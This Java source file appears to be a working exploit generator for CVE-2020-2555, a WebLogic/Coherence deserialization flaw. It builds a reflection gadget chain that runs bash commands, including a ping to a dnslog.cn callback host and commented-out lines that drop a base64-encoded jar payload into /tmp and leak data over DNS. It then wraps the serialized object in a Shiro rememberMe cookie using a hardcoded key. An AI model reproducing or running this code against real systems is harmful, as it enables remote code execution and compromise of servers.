package org.chabug.cve;

import org.chabug.utils.Serializables;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.unicodesec.EncryptUtil;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class CVE_2020_2555 {
    public static void main(String[] args) throws Exception {
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}

        );

        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}

        );

        // invoke("exec","calc")
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
//                new Object[]{new String[]{"/bin/bash", "-c", "echo  |base64 -d > /tmp/MyAntShellFilter.class"}}
//                new Object[]{new String[]{"/bin/bash", "-c", "echo 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 |base64 -d > /tmp/tttt.jar"}}
//                new Object[]{new String[]{"/bin/bash", "-c", "ping `cat /tmp/tttt.jar|wc -c`.w.pjv6fz.dnslog.cn"}}
                new Object[]{new String[]{"/bin/bash", "-c", "ping e861f4.dnslog.cn"}}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize

        byte[] buf = Serializables.serialize(badAttributeValueExpException);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
        System.out.println(rememberMe);

//        // test
        serialize(badAttributeValueExpException);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
